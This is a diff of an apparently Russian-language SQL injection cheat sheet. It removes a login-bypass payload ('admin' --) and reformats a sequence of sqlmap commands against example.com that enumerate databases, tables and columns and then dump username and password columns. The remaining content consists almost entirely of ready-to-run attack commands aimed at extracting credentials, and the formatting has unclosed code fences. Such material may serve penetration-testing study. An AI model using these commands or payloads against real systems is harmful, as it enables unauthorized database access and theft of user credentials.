@@ -1,20 +1,27 @@
-SQL Injection Payload:
-> ```bash
-> SELECT * FROM users WHERE username = 'admin' --';
-
-
-
 Определение базы данных:
-sqlmap -u "http://example.com/index.php?id=1" --dbs
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1" --dbs
 
 Определение таблиц в базе:
-sqlmap -u "http://example.com/index.php?id=1" -D target_db --tables
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1" -D target_db --tables
 
 Определение колонок в таблице:
-sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table --columns
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table --columns
 
 Извлечение данных из таблицы:
-sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table -C username,password --dump
+> ```bash
+> sqlmap -u "http://example.com/index.php?id=1" -D target_db -T target_table -C username,password --dump
+
+
+
+
+
+
+
+
+
 
 GET-параметры
 sqlmap -u "http://example.com/index.php?id=1"
